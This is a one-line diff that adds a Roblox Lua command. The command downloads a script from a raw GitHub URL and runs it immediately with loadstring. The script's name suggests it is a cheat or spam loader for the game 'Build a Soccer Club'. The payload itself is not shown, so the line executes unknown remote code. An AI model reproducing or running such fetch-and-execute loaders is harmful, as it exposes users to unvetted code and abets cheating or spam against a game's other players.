@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/build-a-soccer-club-spam2-y2nb7xuymbhs8d.lua"))()
